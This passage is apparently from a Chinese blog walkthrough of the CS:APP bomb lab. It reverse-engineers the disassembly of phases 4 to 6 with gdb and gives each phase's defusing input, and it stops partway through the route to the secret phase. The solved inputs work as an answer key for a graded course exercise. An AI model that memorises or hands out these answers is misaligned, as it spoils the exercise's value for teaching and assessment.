<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048dae:	83 7d f0 07          	cmpl   $0x7,-0x10(%ebp)</span><br><span class="line">8048db2:	74 05                	je     8048db9 &lt;phase_4+0x5b&gt;</span><br><span class="line">8048db4:	e8 d2 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>确认第一个输入为<code>14</code>后，分析紧接着的汇编程序，发现要求<code>-0x10(%ebp)</code>为<code>0x7</code>，一石二鸟，我们现在知道了<code>phase_4</code>的完整答案</p>
<p><code>14 7</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112192130058.png" alt="image-20211219213016684"></p>
<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">08048dcc &lt;phase_5&gt;:</span><br><span class="line"> 8048dcc:	55                   	push   %ebp</span><br><span class="line"> 8048dcd:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048dcf:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048dd2:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax</span><br><span class="line"> 8048dd8:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048ddb:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 8048ddd:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line"> 8048de0:	50                   	push   %eax</span><br><span class="line"> 8048de1:	8d 45 ec             	lea    -0x14(%ebp),%eax</span><br><span class="line"> 8048de4:	50                   	push   %eax</span><br><span class="line"> 8048de5:	68 ef a2 04 08       	push   $0x804a2ef</span><br><span class="line"> 8048dea:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048ded:	e8 1e fa ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> 8048df2:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048df5:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line"> 8048df8:	7f 05                	jg     8048dff &lt;phase_5+0x33&gt;</span><br><span class="line"> 8048dfa:	e8 8c 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048dff:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048e02:	83 e0 0f             	and    $0xf,%eax</span><br><span class="line"> 8048e05:	89 45 ec             	mov    %eax,-0x14(%ebp)</span><br><span class="line"> 8048e08:	83 f8 0f             	cmp    $0xf,%eax</span><br><span class="line"> 8048e0b:	74 2c                	je     8048e39 &lt;phase_5+0x6d&gt;</span><br><span class="line"> 8048e0d:	b9 00 00 00 00       	mov    $0x0,%ecx</span><br><span class="line"> 8048e12:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line"> 8048e17:	83 c2 01             	add    $0x1,%edx</span><br><span class="line"> 8048e1a:	8b 04 85 a0 a1 04 08 	mov    0x804a1a0(,%eax,4),%eax</span><br><span class="line"> 8048e21:	01 c1                	add    %eax,%ecx</span><br><span class="line"> 8048e23:	83 f8 0f             	cmp    $0xf,%eax</span><br><span class="line"> 8048e26:	75 ef                	jne    8048e17 &lt;phase_5+0x4b&gt;</span><br><span class="line"> 8048e28:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)</span><br><span class="line"> 8048e2f:	83 fa 0f             	cmp    $0xf,%edx</span><br><span class="line"> 8048e32:	75 05                	jne    8048e39 &lt;phase_5+0x6d&gt;</span><br><span class="line"> 8048e34:	3b 4d f0             	cmp    -0x10(%ebp),%ecx</span><br><span class="line"> 8048e37:	74 05                	je     8048e3e &lt;phase_5+0x72&gt;</span><br><span class="line"> 8048e39:	e8 4d 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048e3e:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048e41:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax</span><br><span class="line"> 8048e48:	74 05                	je     8048e4f &lt;phase_5+0x83&gt;</span><br><span class="line"> 8048e4a:	e8 41 f9 ff ff       	call   8048790 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 8048e4f:	c9                   	leave  </span><br><span class="line"> 8048e50:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>按照流程，先检查输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">8048ddd:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line">8048de0:	50                   	push   %eax</span><br><span class="line">8048de1:	8d 45 ec             	lea    -0x14(%ebp),%eax</span><br><span class="line">8048de4:	50                   	push   %eax</span><br><span class="line">8048de5:	68 ef a2 04 08       	push   $0x804a2ef</span><br><span class="line">8048dea:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line">8048ded:	e8 1e fa ff ff       	call   8048810 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">8048df2:	83 c4 10             	add    $0x10,%esp</span><br><span class="line">8048df5:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">8048df8:	7f 05                	jg     8048dff &lt;phase_5+0x33&gt;</span><br><span class="line">8048dfa:	e8 8c 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>经过之前的<code>phase_3</code>和<code>phase_4</code>，这里我们已经很熟悉了，输入两个数据<code>-0x10(%ebp)</code>和<code>-0x14(%ebp)</code>，<code>0x804a2ef</code>是输入格式，<code>%eax</code>用于检查格式，格式不正确就爆炸</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112192137488.png" alt="image-20211219213711359"></p>
<p>依然是2个整型，输入<code>66</code>、<code>99</code>继续执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8048dff:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line">8048e02:	83 e0 0f             	and    $0xf,%eax</span><br><span class="line">8048e05:	89 45 ec             	mov    %eax,-0x14(%ebp)</span><br><span class="line">8048e08:	83 f8 0f             	cmp    $0xf,%eax</span><br><span class="line">8048e0b:	74 2c                	je     8048e39 &lt;phase_5+0x6d&gt;</span><br></pre></td></tr></table></figure>
<p>注意到第一个对<code>%eax</code>的要求是其不能等于<code>0xf</code>，否则就跳转<code>&lt;phase_5+0x6d&gt;</code>爆炸，<code>%eax</code>就是我们第一个输入的数据<code>-0x14(%ebp)</code>，在<code>mov</code>指令之后，对<code>%eax</code>进行了与<code>0xf</code>的<code>and</code>运算，我们都知道<code>0xf</code>就是二进制的<code>1111</code>，<code>0xf</code>与<code>%eax</code>与运算，则说明不论输入数据值为多少，都只取最后4位，因此<code>%eax</code>范围就是<code>0~15</code>，又不能等于<code>15</code>，于是范围<code>0~14</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">8048e0d:	b9 00 00 00 00       	mov    $0x0,%ecx</span><br><span class="line">8048e12:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">8048e17:	83 c2 01             	add    $0x1,%edx</span><br><span class="line">8048e1a:	8b 04 85 a0 a1 04 08 	mov    0x804a1a0(,%eax,4),%eax</span><br><span class="line">8048e21:	01 c1                	add    %eax,%ecx</span><br><span class="line">8048e23:	83 f8 0f             	cmp    $0xf,%eax</span><br><span class="line">8048e26:	75 ef                	jne    8048e17 &lt;phase_5+0x4b&gt;</span><br><span class="line">8048e28:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)</span><br><span class="line">8048e2f:	83 fa 0f             	cmp    $0xf,%edx</span><br><span class="line">8048e32:	75 05                	jne    8048e39 &lt;phase_5+0x6d&gt;</span><br><span class="line">8048e34:	3b 4d f0             	cmp    -0x10(%ebp),%ecx</span><br><span class="line">8048e37:	74 05                	je     8048e3e &lt;phase_5+0x72&gt;</span><br><span class="line">8048e39:	e8 4d 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>这一句段是<code>phase_5</code>的核心，一开始<code>%ecx</code>、<code>%edx</code>初始化为<code>0</code>，<code>0x804a1a0</code>处是一个类似于数组的结构，具体的对应索引我们不清楚</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112192256573.png" alt="image-20211219225622284"></p>
<p>总之就是一顿操作后把结果给<code>%eax</code>，再<code>%eax + %ecx</code>，分析后面的程序我们可以知道，这个<code>%ecx</code>是储存每一个循环的<code>%eax</code>累计之和，就是一个累加器，<code>%edx</code>是循环计数器，每循环一次就<code>+1</code>，然后我们看到要比较<code>%eax</code>和<code>0xf</code>的值，意思是<code>%eax</code>不是<code>15</code>就重新开始循环，我们便知最后一步中<code>%eax</code>的值为<code>15</code>，通过检查之后，要求<code>%edx</code>为<code>15</code>，所以我们要进行15次循环，循环结束后再次比较<code>%ecx</code>与<code>-0x10(%ebp)</code>，<code>-0x10(%ebp)</code>是我们第二个输入的数据，<code>%ecx</code>是累加之和，因此这段程序我们明了了，第一个输入的数据是数组的第一个数，只要它不是数组的最后一个数<code>15</code>，就指向数组的下一个数，<code>%edx</code>计数器+1，循环15次，统计累加之和，和就是第二个输入的数，这里我们可以激动地从0到14遍历看相互之间的顺序，机智如我看清了这个数组的真面目，其实他是一个链表</p>
<p><code>5-&gt;12-&gt;3-&gt;7-&gt;11-&gt;13-&gt;9-&gt;4-&gt;8-&gt;0-&gt;1-&gt;2-&gt;14-&gt;6-&gt;15</code></p>
<p>因此我们晓得，从链表的第一个数开始，就可以循环15次，到链表结尾<code>15</code>，第一个输入的数便是链表的开头<code>5</code>，第二个数便是链表的数之和<code>115</code></p>
<p>因此<code>phase_5</code>答案</p>
<p><code>5 115</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112192312084.png" alt="image-20211219231241736"></p>
<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">08048e51 &lt;phase_6&gt;:</span><br><span class="line"> 8048e51:	55                   	push   %ebp</span><br><span class="line"> 8048e52:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048e54:	56                   	push   %esi</span><br><span class="line"> 8048e55:	53                   	push   %ebx</span><br><span class="line"> 8048e56:	83 ec 48             	sub    $0x48,%esp</span><br><span class="line"> 8048e59:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax</span><br><span class="line"> 8048e5f:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048e62:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 8048e64:	8d 45 c4             	lea    -0x3c(%ebp),%eax</span><br><span class="line"> 8048e67:	50                   	push   %eax</span><br><span class="line"> 8048e68:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048e6b:	e8 43 03 00 00       	call   80491b3 &lt;read_six_numbers&gt;</span><br><span class="line"> 8048e70:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048e73:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line"> 8048e78:	8b 44 b5 c4          	mov    -0x3c(%ebp,%esi,4),%eax</span><br><span class="line"> 8048e7c:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line"> 8048e7f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line"> 8048e82:	76 05                	jbe    8048e89 &lt;phase_6+0x38&gt;</span><br><span class="line"> 8048e84:	e8 02 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048e89:	83 c6 01             	add    $0x1,%esi</span><br><span class="line"> 8048e8c:	83 fe 06             	cmp    $0x6,%esi</span><br><span class="line"> 8048e8f:	74 33                	je     8048ec4 &lt;phase_6+0x73&gt;</span><br><span class="line"> 8048e91:	89 f3                	mov    %esi,%ebx</span><br><span class="line"> 8048e93:	8b 44 9d c4          	mov    -0x3c(%ebp,%ebx,4),%eax</span><br><span class="line"> 8048e97:	39 44 b5 c0          	cmp    %eax,-0x40(%ebp,%esi,4)</span><br><span class="line"> 8048e9b:	75 05                	jne    8048ea2 &lt;phase_6+0x51&gt;</span><br><span class="line"> 8048e9d:	e8 e9 02 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048ea2:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line"> 8048ea5:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line"> 8048ea8:	7e e9                	jle    8048e93 &lt;phase_6+0x42&gt;</span><br><span class="line"> 8048eaa:	eb cc                	jmp    8048e78 &lt;phase_6+0x27&gt;</span><br><span class="line"> 8048eac:	8b 52 08             	mov    0x8(%edx),%edx</span><br><span class="line"> 8048eaf:	83 c0 01             	add    $0x1,%eax</span><br><span class="line"> 8048eb2:	39 c8                	cmp    %ecx,%eax</span><br><span class="line"> 8048eb4:	75 f6                	jne    8048eac &lt;phase_6+0x5b&gt;</span><br><span class="line"> 8048eb6:	89 54 b5 dc          	mov    %edx,-0x24(%ebp,%esi,4)</span><br><span class="line"> 8048eba:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line"> 8048ebd:	83 fb 06             	cmp    $0x6,%ebx</span><br><span class="line"> 8048ec0:	75 07                	jne    8048ec9 &lt;phase_6+0x78&gt;</span><br><span class="line"> 8048ec2:	eb 1c                	jmp    8048ee0 &lt;phase_6+0x8f&gt;</span><br><span class="line"> 8048ec4:	bb 00 00 00 00       	mov    $0x0,%ebx</span><br><span class="line"> 8048ec9:	89 de                	mov    %ebx,%esi</span><br><span class="line"> 8048ecb:	8b 4c 9d c4          	mov    -0x3c(%ebp,%ebx,4),%ecx</span><br><span class="line"> 8048ecf:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 8048ed4:	ba 3c c1 04 08       	mov    $0x804c13c,%edx</span><br><span class="line"> 8048ed9:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line"> 8048edc:	7f ce                	jg     8048eac &lt;phase_6+0x5b&gt;</span><br><span class="line"> 8048ede:	eb d6                	jmp    8048eb6 &lt;phase_6+0x65&gt;</span><br><span class="line"> 8048ee0:	8b 5d dc             	mov    -0x24(%ebp),%ebx</span><br><span class="line"> 8048ee3:	8d 45 dc             	lea    -0x24(%ebp),%eax</span><br><span class="line"> 8048ee6:	8d 75 f0             	lea    -0x10(%ebp),%esi</span><br><span class="line"> 8048ee9:	89 d9                	mov    %ebx,%ecx</span><br><span class="line"> 8048eeb:	8b 50 04             	mov    0x4(%eax),%edx</span><br><span class="line"> 8048eee:	89 51 08             	mov    %edx,0x8(%ecx)</span><br><span class="line"> 8048ef1:	83 c0 04             	add    $0x4,%eax</span><br><span class="line"> 8048ef4:	89 d1                	mov    %edx,%ecx</span><br><span class="line"> 8048ef6:	39 f0                	cmp    %esi,%eax</span><br><span class="line"> 8048ef8:	75 f1                	jne    8048eeb &lt;phase_6+0x9a&gt;</span><br><span class="line"> 8048efa:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)</span><br><span class="line"> 8048f01:	be 05 00 00 00       	mov    $0x5,%esi</span><br><span class="line"> 8048f06:	8b 43 08             	mov    0x8(%ebx),%eax</span><br><span class="line"> 8048f09:	8b 00                	mov    (%eax),%eax</span><br><span class="line"> 8048f0b:	39 03                	cmp    %eax,(%ebx)</span><br><span class="line"> 8048f0d:	7e 05                	jle    8048f14 &lt;phase_6+0xc3&gt;</span><br><span class="line"> 8048f0f:	e8 77 02 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line"> 8048f14:	8b 5b 08             	mov    0x8(%ebx),%ebx</span><br><span class="line"> 8048f17:	83 ee 01             	sub    $0x1,%esi</span><br><span class="line"> 8048f1a:	75 ea                	jne    8048f06 &lt;phase_6+0xb5&gt;</span><br><span class="line"> 8048f1c:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048f1f:	65 33 05 14 00 00 00 	xor    %gs:0x14,%eax</span><br><span class="line"> 8048f26:	74 05                	je     8048f2d &lt;phase_6+0xdc&gt;</span><br><span class="line"> 8048f28:	e8 63 f8 ff ff       	call   8048790 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 8048f2d:	8d 65 f8             	lea    -0x8(%ebp),%esp</span><br><span class="line"> 8048f30:	5b                   	pop    %ebx</span><br><span class="line"> 8048f31:	5e                   	pop    %esi</span><br><span class="line"> 8048f32:	5d                   	pop    %ebp</span><br><span class="line"> 8048f33:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p><code>phase_6</code>了，我们离成功不远了！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">8048e6b:	e8 43 03 00 00       	call   80491b3 &lt;read_six_numbers&gt;</span><br><span class="line">8048e70:	83 c4 10             	add    $0x10,%esp</span><br><span class="line">8048e73:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">8048e78:	8b 44 b5 c4          	mov    -0x3c(%ebp,%esi,4),%eax</span><br><span class="line">8048e7c:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">8048e7f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">8048e82:	76 05                	jbe    8048e89 &lt;phase_6+0x38&gt;</span><br><span class="line">8048e84:	e8 02 03 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line">8048e89:	83 c6 01             	add    $0x1,%esi</span><br><span class="line">8048e8c:	83 fe 06             	cmp    $0x6,%esi</span><br><span class="line">8048e8f:	74 33                	je     8048ec4 &lt;phase_6+0x73&gt;</span><br><span class="line">8048e91:	89 f3                	mov    %esi,%ebx</span><br><span class="line">8048e93:	8b 44 9d c4          	mov    -0x3c(%ebp,%ebx,4),%eax</span><br><span class="line">8048e97:	39 44 b5 c0          	cmp    %eax,-0x40(%ebp,%esi,4)</span><br><span class="line">8048e9b:	75 05                	jne    8048ea2 &lt;phase_6+0x51&gt;</span><br><span class="line">8048e9d:	e8 e9 02 00 00       	call   804918b &lt;explode_bomb&gt;</span><br><span class="line">8048ea2:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line">8048ea5:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">8048ea8:	7e e9                	jle    8048e93 &lt;phase_6+0x42&gt;</span><br><span class="line">8048eaa:	eb cc                	jmp    8048e78 &lt;phase_6+0x27&gt;</span><br></pre></td></tr></table></figure>
<p><code>&lt;read_six_numbers&gt;</code>，老朋友了，所以我们要输入6个整型，并且读入的第一个数<code>-0x3c(%ebp,%esi,4)</code>给了<code>%eax</code>，<code>cmp</code>要求<code>%eax &lt;= 5</code>，因为<code>%eax</code>在<code>cmp</code>之前减了<code>1</code>所以要求输入<code>-0x3c(%ebp,%esi,4) &lt;= 6</code>，不仅如此，<code>%esi</code>作为计数器，每检查一个数便<code>+1</code>，一共检查<code>6</code>个数，所以输入的6个数都必须<code>&lt;= 6</code>，之后还出现了<code>-0x3c(%ebp,%ebx,4)</code> 与 <code>-0x40(%ebp,%esi,4)</code>的相等检查，这两个参数是输入中相邻的两个数，因此还要求相邻的两数不相等，所以我们的输入要求是</p>
<ul>
<li>6个&lt;=6的数</li>
<li>相邻两输入不相等</li>
</ul>
<p>除此之外这又臭又长的程序我实在是懒得分析了，所以我们试着换个角度切入，在输入合规的数据后，我们直接跳到爆炸函数处看看附近有没有什么值得分析的东西，为什么可以这么做，因为我们输入的数据99%会爆炸(1/46,656概率能中)，如果你能一次就输对，那么请你离我远点</p>
<p>我们尝试一种输入</p>
<p><code>1 2 3 4 5 6</code></p>
<p>直接来到爆炸点</p>
<p><code>until *0x8048f0f</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8048f06:	8b 43 08             	mov    0x8(%ebx),%eax</span><br><span class="line">8048f09:	8b 00                	mov    (%eax),%eax</span><br><span class="line">8048f0b:	39 03                	cmp    %eax,(%ebx)</span><br><span class="line">8048f0d:	7e 05                	jle    8048f14 &lt;phase_6+0xc3&gt;</span><br><span class="line">8048f0f:	e8 77 02 00 00       	call   804918b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>我们从爆炸点开始反推，为什么会爆炸，是因为<code>(%ebx) &gt; %eax</code>，那么这两个东西分别指代啥</p>
<p>先看<code>%eax</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200000290.png" alt="image-20211220000015461"></p>
<p><code>%eax</code>是<code>406</code>，这个<code>406</code>没见过，看不出来是啥，我们再看<code>(%ebx)</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200002486.png" alt="image-20211220000200152"></p>
<p>发现有个<code>&lt;node1&gt;</code>，猜想这可能是一种数据结构，我们细看</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200003761.png" alt="image-20211220000316310"></p>
<p>这个第一列的<code>1c4</code>正是<code>&lt;node1&gt;</code>的值<code>452</code>，第二列<code>1</code>是<code>&lt;node1&gt;</code>的索引，第三列不知道，我们查看一下</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200007147.png" alt="image-20211220000708256" style="zoom:80%;" /></p>
<p>惊喜的发现，第三列储存的是本节点的下个节点的地址，我们依次顺下去，发现一共有6个节点</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">node</th>
<th style="text-align:center">value</th>
<th style="text-align:center">index</th>
<th style="text-align:center">next(节点)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">node1</td>
<td style="text-align:center">452</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">node2</td>
<td style="text-align:center">406</td>
<td style="text-align:center">2</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">node3</td>
<td style="text-align:center">850</td>
<td style="text-align:center">3</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">node4</td>
<td style="text-align:center">146</td>
<td style="text-align:center">4</td>
<td style="text-align:center">5</td>
</tr>
<tr>
<td style="text-align:center">node5</td>
<td style="text-align:center">813</td>
<td style="text-align:center">5</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">node6</td>
<td style="text-align:center">617</td>
<td style="text-align:center">6</td>
<td style="text-align:center">0(null)</td>
</tr>
</tbody>
</table>
</div>
<p>之前我们研究发现是因为<code>(%ebx) &gt; %eax</code>所以爆炸，也就是说<code>452 &gt; 406</code>所以爆炸，也就是<code>node1 &gt; node2</code>所以爆炸，又由于我们最开始的输入顺序是<code>1 -&gt; 2</code>，所以要求就应该是<code>2 -&gt; 1</code>，<code>node2</code> 在前，这样<code>406 &lt;= 452</code>，所以就是要我们升序输出这6个节点，所以我们的6个输入就是6个节点的<code>index</code>，把升序排序后的结果整理出来就可以了</p>
<p><code>146 &lt; 406 &lt; 452 &lt; 617 &lt; 813 &lt; 850</code></p>
<p><code>4 &lt;- 2 &lt;- 1 &lt;- 6 &lt;- 5 &lt;- 3</code></p>
<p>因此<code>phase_6</code>的答案便是</p>
<p><code>4 2 1 6 5 3</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112200020892.png" alt="image-20211220002028355" style="zoom:80%;" /></p>
<h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>你以为结束了吗？NONONONONONONONONONONONONONONONONONONONONONO</p>
<p>我们先得想办法进入<code>secret_phase</code></p>
<p>问题来了，<code>secret_phase</code>的入口在哪？查找整个<code>asm.txt</code>，发现了这么一处</p>
<p><code>8049361:    e8 20 fc ff ff           call   8048f86 &lt;secret_phase&gt;</code></p>
<p>你猜这是哪个函数里面的，<code>&lt;phase_defused&gt;</code>里的</p>
<p>你说不对啊，我看了那么长时间的6个<code>phase</code>，没见这么个函数啊</p>
<p>那确实，这个函数不在任意一个<code>phase</code>里，它在<code>&lt;main&gt;</code>函数里</p>
<p>好的那么如何召唤<code>&lt;secret_phase&gt;</code>呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">080492f0 &lt;phase_defused&gt;:</span><br><span class="line"> 80492f0:	55                   	push   %ebp</span><br><span class="line"> 80492f1:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 80492f3:	83 ec 68             	sub    $0x68,%esp</span><br><span class="line"> 80492f6:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax</span><br><span class="line"> 80492fc:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 80492ff:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 8049301:	83 3d cc c3 04 08 06 	cmpl   $0x6,0x804c3cc</span><br><span 